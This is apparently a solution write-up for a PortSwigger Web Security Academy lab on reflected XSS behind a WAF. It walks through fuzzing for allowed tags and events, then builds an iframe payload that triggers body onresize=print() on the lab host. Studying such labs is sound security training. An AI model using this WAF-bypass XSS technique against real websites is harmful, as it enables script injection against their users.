## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/bc32aa06-b5ab-421c-9dae-34d96acf6cf5)

## Solution :

The search functionality is vulnerable to reflected XSS but common XSS payloads won't work since there is a WAF in place.

Our search string is embedded in the apge as follows,

```html
<h1>0 search results for 'hello'</h1>
```

Injecting a normal XSS payload like `<script>alert()</script>` gets blocked by WAF.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/32272d79-89a6-441c-aba4-65e665f52d47)

### Identify which tag is allowed -

Enter the search term as `<>`. Capture the request and send it to intruder. Add *<$$>* as payload position.

```http
GET /?search=<§§> HTTP/1.1
Host: 0a1300d9043edb1c818d61cc009200c0.web-security-academy.net
Cookie: session=PwoeDxVtyiAquLqztnpHiyQnevAosy2n
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a1300d9043edb1c818d61cc009200c0.web-security-academy.net/?search=hello
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

Go to **XSS cheatsheet** and click **copy tags to clipboard**.Paste it in payloads section & start the attack.

From the results, we can see that **<body>** tag is allowed.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/f98a5085-fcc3-4bfb-a83b-e7f2ba66d77e)

### Identify which event is allowed -

Now update the search term to `<body%20=1>`

Add the payload position as follows - `<body%20$$=1>`

Go to XSS Cheatsheet & copy all the events and paste it in payload section.Start the attack.

From the results we understand **onresize** event is allowed.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/c29be8cf-f2f2-4734-8389-a627c4af8b7e)

### Identify the right payload - 

Update the search term to `<body%20onresize=1>`.

Now we can use the cheatsheet to find our right payload. In this case it is - **<body onresize="print()">**

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/401424c8-455e-4d89-a378-73b8c1084d0a)

Resize the page to trigger an print() function.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/0bc38a02-6fd7-4f18-9783-56c1b535a700)

In order to solve the lab, there must not be user interaction to trigger the payload since it is sent to victim.
  The print command needs to be performed automatically without any user interaction. Therefore I need a way to enforce the resize event without requiring the victim to do it.So I include `onload=this.style.width='100px'` to automatically resize the page when it loads . This willl now trigger an XSS .

#### Final payload -

```
<iframe src="https://0a1300d9043edb1c818d61cc009200c0.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
> URL-encode the entire search term to ensure nothing goes amiss inside the iframe.

Store & deliver exploit to victim to solve the lab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/9981577a-0611-4b82-915e-4622eb901da8)
